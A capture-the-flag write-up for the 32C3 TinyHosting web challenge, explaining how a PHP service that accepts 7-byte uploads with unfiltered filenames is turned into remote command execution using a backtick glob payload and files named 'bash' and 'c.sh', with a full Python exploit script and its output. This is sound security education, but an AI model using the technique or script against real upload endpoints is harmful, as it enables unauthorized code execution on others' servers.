---
title: "32C3CTF - TinyHosting (Web 250)"
header:
  image: /assets/images/32c3/tinyhosting/header.png
tags:
  - 32c3
  - writeup
  - web
---

A PHP service that allows uploading of small files (<= 7 bytes) with arbitrary
filenames within a browsable path.

## Challenge Description

#### Points

250

#### Description

```
A new file hosting service for very small files. could you pwn it?

http://136.243.194.53/
```

## Solution

In the comments, there is a hint to use `./?src` to obtain the source code to
the index.php.

```html
    <!-- <a href="./?src=">src</a>-->
```

From the returned source, we get some very interesting PHP code:

```php
<?php
    $savepath="files/".sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT'])."/";
    if(!is_dir($savepath)){
        $oldmask = umask(0);
        mkdir($savepath, 0777);
        umask($oldmask);
        touch($savepath."/index.html");
    }
    if((@$_POST['filename']) && (@$_POST['content']) ){
        $fp = fopen("$savepath".$_POST['filename'], 'w');
        fwrite($fp, substr($_POST['content'],0,7) );
        fclose($fp);
        $msg = 'File saved to <a>'.$savepath.htmlspecialchars($_POST['filename'])."</a>";
    }
?>
```

What the code does is:

1. Create a `$savepath` variable that is derived from the remote user's IP address
   and user agent.
2. Create a directory from the variable that was just derived if it does not exist
   and touch an `index.html`.
3. If the POST parameters `filename` and `content` exists, create a file with the
   provided name containing the first seven bytes of the given content.

Now, obviously since there is no filtering done on the filename, and you are
given the path to the file created, you can create files with the extension `.php`.
However, we only have 7 bytes to play with in the file so the [shortest PHP
shell](https://twitter.com/brutelogic/status/379357222524162049) is out of the
question. Now, our solution was to use bash expansions to execute arbitrary
code. We can put the contents of the following in a file called `z.php` (we will
tell you the reason why it is named so in a bit):

```php
<?=`*`;
```

If we run this in the directory:

```shell
$ php z.php
sh: 1: z.php: not found
```

Notice that it tries to run the `z.php` file.  Now, what happens if there was
another file called "a"?

```shell
$ touch a
$ php z.php
sh: 1: a: not found
```

Looks like bash expansion with * replaces it with the files in the current
directory in alphabetical order:

```shell
$ echo *
a z.php
```

Now, this means that if we can create a series of files that when sorted in
alphabetical order resembles a valid command, our `z.php` script will execute it.
Our final exploit uses the following files:

```shell
$ ls
bash  c.sh  z.php
```

This should run the `c.sh` script with bash as `z.php` as an argument. This means
we can execute any command up to 7 bytes if we put it in the `c.sh` file.

```shell
$ touch bash
$ echo "id" > c.sh
$ *
uid=1000(amon) gid=1000(amon) groups=1000(amon),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

Here is the full exploit:

```python
import re
import requests
import random
import sys

location = "http://136.243.194.53/"
seed = random.randint(0, 100000000000)
HEADER = {'User-Agent': 'DystopianNarwhals' + str(seed)}

def launch(stage):
    pat = re.compile(r'File saved to <a>(.+)?</a>')
    req = requests.post(location, data=stage, headers=HEADER)
    locs = pat.findall(req.text)[0]
    return (req.text, locs)

def main():


    cmd = sys.argv[1].strip()

    if len(cmd) > 7:
        print "7 or less."
        exit()

    stage1 = {"filename": "z.php", "content": "<?=`*`;"}
    stage2 = {"filename": "bash", "content": "amon"}
    stage3 = {"filename": "c.sh", "content": cmd}


    locs1 = launch(stage1)[1]
    print "Stage 1 saved to: %s" % locs1

    locs2 = launch(stage2)[1]
    print "Stage 2 saved to %s" % locs2

    locs3 = launch(stage3)[1]
    print "Stage 3 saved to %s" % locs3

    reqr5 = requests.get("http://136.243.194.53/" + locs1)
    print "Result of injection:"
    print reqr5.text

if __name__ == "__main__":
    main()
```

Notice that the User Agent is randomised every time the script is run so that we
get an empty directory and prevent (unlikely) collisions with other players. We
had discovered that the flag was located at `/file_you_are_looking_for` after
some exploration. Running the script gets us the flag:

```shell
$ python exploit.py "cat /f*"
Stage 1 saved to: files/cbfa3423b05463eff64d967062eb8fa8e620000d/z.php
Stage 2 saved to files/cbfa3423b05463eff64d967062eb8fa8e620000d/bash
Stage 3 saved to files/cbfa3423b05463eff64d967062eb8fa8e620000d/c.sh
Result of injection:
32c3_Gr34T_Th1ng5_Are_D0ne_By_A_Ser13s_0f_5ma11_Th1ngs_Br0ught_T0ge7h3r
```

Flag: **32c3\_Gr34T\_Th1ng5\_Are\_D0ne\_By\_A\_Ser13s\_0f\_5ma11\_Th1ngs\_Br0ught\_T0ge7h3r**
